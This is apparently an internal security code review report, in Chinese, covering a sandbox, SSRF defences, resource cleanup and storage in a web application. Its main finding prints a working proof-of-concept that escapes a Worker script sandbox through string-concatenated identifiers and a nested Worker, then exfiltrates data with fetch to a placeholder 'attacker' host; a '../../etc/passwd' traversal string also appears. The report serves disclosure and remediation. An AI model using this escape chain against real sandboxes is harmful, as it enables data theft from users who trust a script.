## 审查发现

### 阻断问题（P1）

#### P1-A　脚本沙箱存在嵌套 Worker 逃逸路径，且黑名单不构成任何边界

**位置**：`src/core/scriptSandbox.ts:3-8`（黑名单）、`:24-33`（校验函数）、`:260-268`（运行时置空）

沙箱由两层组成：

1. **词法黑名单** `BLOCKED_TOKENS`（28 个 token，`\btoken\b` 正则匹配）；
2. **运行时置空**：在 Worker 引导代码里对 11 个 API 做 `defineProperty(self, api, { value: undefined, writable: false, configurable: false })`，同时作用于 `self` 与其原型。

```
置空列表：fetch, XMLHttpRequest, WebSocket, EventSource, BroadcastChannel,
         importScripts, indexedDB, caches, setTimeout, setInterval, postMessage
```

第 2 层是真正的边界，工作正常。**问题在第 2 层不完整，而第 1 层可被字符串拼接绕过**：

| 标识符 | 在黑名单 | 在置空列表 | 结论 |
| :--- | :---: | :---: | :--- |
| `Worker` | 是 | **否** | 可嵌套建 Worker |
| `SharedWorker` | 否 | 否 | 未覆盖 |
| `Blob` | 否 | 否 | 可造脚本源 |
| `URL` | 否 | **否** | 可造 blob: 地址 |
| `WebTransport` | 否 | 否 | 独立的网络出口 |
| `WebAssembly` | 否 | 否 | 未覆盖 |

逃逸链路（全部标识符均不命中黑名单）：

```js
const F = (async () => {})['constr' + 'uctor'];        // AsyncFunction
const g = F('return self')();                          // WorkerGlobalScope
const u = g['U' + 'RL'].createObjectURL(
  new g['Bl' + 'ob'](['fetch("https://attacker/?d="+JSON.stringify(1))'],
                     { type: 'application/javascript' })
);
new (g['Wor' + 'ker'])(u);                             // 全新上下文，fetch 可用
```

嵌套 Worker 是全新执行环境，父 Worker 的 `defineProperty` 不继承，因此 `fetch` / `WebSocket` / `importScripts` 全部复活。

**影响面**：脚本拿得到 `vars`（含控件文本、变量、蓝图数据），逃逸后可外发。触发前提是用户先在 `ScriptTrustModal` 里对不可信脚本点了「信任」——即从导入的蓝图 JSON 或协同房间收到的脚本。**因此不是「打开页面即中招」，而是「信任一个恶意脚本后，黑名单承诺的隔离并不存在」。**

**为什么算阻断**：`AGENTS.md:154` 明确写着「脚本沙箱的 token 黑名单是安全边界，新增内置脚本或模板脚本后必须确认不命中黑名单」。这句话会让后续维护者把黑名单当作验收标准，而黑名单本身对上述链路完全无效。文档与实现的落差本身就是风险。

**处理动作**：未改（需产品决策，见下）。建议：

1. 把 `Worker`、`SharedWorker`、`Blob`、`URL`、`WebTransport`、`WebAssembly` 加入运行时置空列表——种子脚本与模板脚本均未使用这些 API（已核对 `seedBlueprint.ts`，3 处命中全是文案字符串）；
2. 置空后追加 `Object.freeze(self)` 并 `delete` 相关全局；
3. 修改 `AGENTS.md:154` 表述为「运行时置空列表是安全边界，黑名单仅作快速反馈」。

#### P3-B　PDF 解包失败时把内部错误原文回给客户端

**位置**：`server/server.ts:946-952`、`server/pdfUnpack.ts:173-177`

```ts
} catch (err) {
  res.status(502).json({ ok: false, error: err instanceof Error ? err.message : 'PDF 解包失败' });
}
```

`err.message` 可能是 `spawn mutool ENOENT`、`Command failed: pdftoppm ... /tmp/atlas-pdf-page-xxxx/input.pdf`，会暴露宿主机缺少哪个二进制、临时目录命名规则。

**影响面**：需先通过鉴权才能到这条路由，故为信息泄露而非直接利用。仅自托管部署可见。

**处理动作**：未改。建议对客户端只回「PDF 渲染失败」，原始错误写服务端日志。

#### P3-C　浏览器侧 fetcher 无响应体上限，与服务端 2MB 不对称

**位置**：`src/core/mockApi.ts:74-95`

```ts
const buf = new Uint8Array(await res.arrayBuffer());
```

服务端 `pinnedOutboundRequest` 有 `maxBytes: 2 * 1024 * 1024` 并在超限时中止；浏览器侧只设了 10s 超时，没有大小限制。纯静态模式下若轮询/代理指向一个返回数百 MB 的地址，整包进内存。

**处理依据**：`Host` 目标由用户在本地选择，属自伤而非被攻击，故非阻断。

**处理动作**：未改。

#### P3-D　`isSafePollUrl` 的名称与行为不符

**位置**：`src/core/apiPoller.ts`

函数放行任意 `http:`/`https:`，不比对 `PROXY_ALLOWED_HOSTS`。命名暗示「安全 URL」，实际只排除了非 http(s) 协议。

**影响面**：浏览器模式下这是用户自己浏览器发请求，CORS 会限制可读性；服务端模式下轮询走 `/api/proxy`，白名单在那里生效。因此不构成 SSRF，但会误导维护者以为浏览器侧也有白名单。

**处理动作**：未改。建议改名 `isFetchableHttpUrl` 或在注释写明「浏览器模式不做域名白名单，白名单只在服务端生效」。

#### P3-E　`v82-review-01.md` 中 P2-2 的死代码，其 `sanitizeRoomFileKey` 语义已被 `roomPathToFileKey` 取代

**位置**：`server/fileStore.ts:40-46`

补充上一份报告：两者语义方向相反——`sanitizeRoomFileKey` 是「破坏性替换」（`../../etc/passwd` → `______etc_passwd`，可能与其他名字碰撞），`roomPathToFileKey` 是「保留原名 + 哈希后缀」（防碰撞）。死代码恰好演示了一种更弱的做法。

**处理动作**：未改，与 P2-2 合并处理。

### 已确认正确

以下均在本次全仓审查中逐行或定点核对过，记录以避免后续重复审查。

**沙箱与执行**

- Worker 引导代码的置空是 `writable: false, configurable: false`，无法用 `delete` 或重新赋值恢复（`scriptSandbox.ts:263-266`）。
- 每次执行后立即 `terminate()`，池容量 `MAX_POOLED_WORKERS = 0`，不存在跨控件内置对象篡改与残留任务串扰（`:744-766`）。
- `MAX_COMPUTE_MS = 5000` 硬超时；`AsyncFunction` 形参显式遮蔽 `window/document/self/fetch/localStorage`。
- `validateScriptSyntax` 只编译不执行，供 Inspector 实时提示，不引入执行面。
- 种子与模板脚本全量通过 `validateScriptSafety` + 语法编译（`scriptSandbox.test.ts:30`）。

**网络与 SSRF**

- `isPrivateOrReservedIP` 覆盖度充分：IPv4 的 `0/8`、`10/8`、`100.64/10`、`127/8`、`169.254/16`（云元数据）、`172.16/12`、`192.0.0/24`、`192.0.2/24`、`192.168/16`、`198.18/15`、`>=224`；IPv6 的 `::`、`::1`、IPv4-mapped `::ffff:0:0/96`、IPv4-compatible `::/96`、NAT64 `64:ff9b::/96`、6to4 `2002::/16`、`100::/64`、`fc00::/7`、`fe80::/10`、`ff00::/8`。
- `pinnedOutboundRequest` 校验后把 IP 钉死到连接目标，防 DNS rebinding 二次解析；不跟随 3xx；2MB 流式上限。
- 上游密钥注入仅在 `target.injectSecret` 为真（即命中 `PROXY_UPSTREAM_BASE_URL` 同源）时发生，且调用方自带同名头时不覆盖。
- 204/304 空 body、`opaqueredirect` → 302 的映射在浏览器与服务端两侧一致。

**资源生命周期**

- `ApiPollerBlock` 的串行链式轮询：`cancelled` 标志 + `clearTimeout` + `abortRef.abort()` + `finally` 守卫，四条路径齐全，不会出现 `setInterval` 堆积（`ApiPollerBlock.tsx:237-272`）。
- `ChunkUnderlayCanvas` 卸载清理覆盖 `disposed` 标志、`unsubscribe`、`removeEventListener('resize')`、`cancelIdlePrefetch`、`cancelAnimationFrame(pendingRaf)`（`:545-551`）；`requestIdleCallback` 与 `setTimeout` 降级路径各自有对应取消函数（`:216-222`）。
- 全仓 `addEventListener` 与 `removeEventListener` 共 7 对，逐条核对**全部配对**：`visibilitychange`、`resize`、`keydown`×2、`beforeunload`×2、`pagehide`。
- `PdfViewerBlock` / `ImageNodeBlock` 的定时器与 keydown 监听均在同一 effect 内清理。

**存储与持久化**

- `parseJsonBody` 内部 `try/catch` 返回 `null`，调用方无需重复兜底（`apiCore.ts:113-120`）。
- `idbCacheSet` 的命名空间 LRU 扫描 `by_touchedAt` 索引，`matchedKeys` 按访问时间升序删除，与命名空间过滤组合正确。
- `useBlueprintHistory` 的 `enqueueIdb` 用 `.then(task, task)` 保证前序失败也继续执行后续任务。

**文档一致性（本次核对无问题项）**

- `.env.example` 已清空 `PROXY_CLIENT_TOKEN` / `VITE_PROXY_CLIENT_TOKEN`，与 v79 的实际实现一致；`AUTH_SESSION_SECRET`、`CORS_ALLOWED_ORIGINS`、`BLUEPRINT_SAVE_KEY` 三项均真实存在且被读取。
- `Dockerfile` 的 builder 阶段执行 `npm run build && npm run build:server`，runner 阶段 `npm ci --omit=dev` + `node dist-server/server.mjs`，与 `package.json:12` 的 esbuild 打包脚本对应。
